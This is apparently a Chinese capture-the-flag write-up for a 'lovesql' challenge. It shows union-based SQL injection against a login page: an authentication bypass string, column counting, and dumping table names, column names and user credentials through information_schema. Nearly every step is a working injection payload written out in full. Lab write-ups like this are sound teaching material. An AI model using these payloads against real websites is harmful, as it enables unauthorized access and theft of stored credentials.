1. 看到登录，测试万能密码

```
check.php?username=admin' or '1'='1&password=1
```

![image-20210731113559889](lovesql.assets/image-20210731113559889.png)

2. 找显示的字段数量和位置

   ```
   check.php?username=admin' order by 4%23='1&password=1
   ```

   ![image-20210731113829794](lovesql.assets/image-20210731113829794.png)

   最大字段数为3

   ```
   check.php?username=1' union select 1,2,3%23='1&password=1
   ```

   ![image-20210731113947368](lovesql.assets/image-20210731113947368.png)

   回显点位置是2和3

3. 常规注入

   查表

   ```
   check.php?username=1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23='1&password=1
   ```

   ![image-20210731114313746](lovesql.assets/image-20210731114313746.png)

   查字段

   ```
   check.php?username=1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23='1&password=1
   ```

   ![image-20210731114800548](lovesql.assets/image-20210731114800548.png)

   查字段所有的内容。flag就在里面

   ```
   check.php?username=1' union select 1,group_concat(id,username,password),3 from l0ve1ysq1%23='1&password=1
   ```

   

   ![image-20210731114936971](lovesql.assets/image-20210731114936971.png)